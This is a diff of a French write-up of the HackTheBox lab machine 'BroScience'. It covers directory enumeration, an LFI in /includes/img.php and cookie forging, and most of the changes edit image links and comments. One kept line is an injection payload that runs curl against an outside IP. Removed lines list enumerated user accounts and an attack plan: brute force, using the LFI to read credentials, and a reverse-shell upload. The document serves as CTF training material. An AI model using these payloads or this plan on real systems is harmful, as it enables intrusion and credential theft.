@@ -18,11 +18,6 @@ Ports TCP ouverts
 ```
 
 
----
-
--t 50  --auto-tune  -u http://$TARGET_VHOST/vendor/ -s '200,204,301,302,307,308,401,403,405,404' -X 'route not defined'  --dont-filter --filter-lines 0 --force-recursion 
-
-
 # Service WEB
 ## Port 80
 La banière du serveur retourne : `Apache/2.4.54 (Debian) Server at broscience.htb Port 80`
@@ -45,18 +40,18 @@ La banière du serveur retourne : `Apache/2.4.54 (Debian) Server at broscience.h
 ```
 feroxbuster -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -t 50  --auto-tune -u https://$TARGET_VHOST/ --filter-status 301,404 -k --add-slash --no-recursion 
 ```
-![[BroScience-1.png]]
-![[BroScience-2.png]]
+![BroScience-1](../../BroScience-1.png)
 
-![[BroScience-3.png]]
+Parmis les dossiers énumérés, le dossier `includes` contient des fichiers intéresant. Il ne sont toutefois pas visualisables mais nous chercherons à les lire par la suite.
+![BroScience-2](../../BroScience-2.png)
 
-La documentation d'apache 2.4 est également hébergée localement :
+On découvre que le dossier `images` contient l'ensemble des images du site
+![BroScience-3](../../BroScience-3.png)
+
+La documentation d'apache 2.4 est également hébergée localement mais ne présente aucun intérêt :
 https://broscience.htb/manual/
-![[BroScience-4.png]]
+![BroScience-4](../../BroScience-4.png)
 
-
-### Technologie utilisée
-![[BroScience-5.png]]
 
 ### Découverte manuelle du site
 ##### Fichier /includes/img.php
@@ -82,36 +77,7 @@ Content-Type: text/html; charset=UTF-8
 	- `' and die(system("curl http://10.10.14.147")) or '`
 	- et autre suggestions provenant de https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
-==> A APPROFONDIR PEUT ETRE
 
-##### Fichier /user.php?id=1
-Enumération des comptes utilisateur avec Burp Intruder 
-![[BroScience-6.png]]
-
-![[BroScience-7.png]]
-
-
-![[BroScience-8.png]]
-
-On trouce 5 comptes (le 6 eme a été créé par moi) : 
-- administrator  (admin)
-- bill
-- michael
-- john
-- dmytro
-
-
-Pistes à explorer :
-- Attaque des 5 comptes (hydra)
-- Tester la LFI sur le manuel apache éventuellement (différent type de fichiers (images notamment))
-- Tentative d'exploitation de la LFI (img.php) pour afficher le /includes/db_connect.php
-
-Chemin d'attaque prévisionnel :
-- Connection à la partie authentifiée du site 
-	- soit via bruteforce simple
-	- soit via utilisation du password de db_connect après l'avoir récupéré via une LFI
-- XSS ou RCE via l'envoie de commentaires OU   exploitation de fonctionnalités de création d'un article (upload d'une image qui serait un reverseshell (LFI/RFI))
--
 
 ```
 # découverte du compte utilisateur 'bill' disposant d'un shell sur le système 
@@ -138,7 +104,7 @@ $db_salt = "NaCl";
 # Découverte du code source de l'application
 
 On énumère ensuite les quelques fichiers constituant le code source de l'application :
-![[BroScience-9.png]]
+![BroScience-9](../../BroScience-9.png)
 
 ## Enumération des vulnérabilités
 En analysant le code de l'application, nous découvrons rapidement  plusieures vulnérabilités :
@@ -327,7 +293,7 @@ On crée puis exécute ce script qui générera un cookie valide qui une fois d�
 ```
 
 On insère ensuite ce cookie dans une requête interceptée à l'aide de Burp :
-![[BroScience-10.png]]
+![BroScience-10](../../BroScience-10.png)
 
 # Obtention d'un shell
 
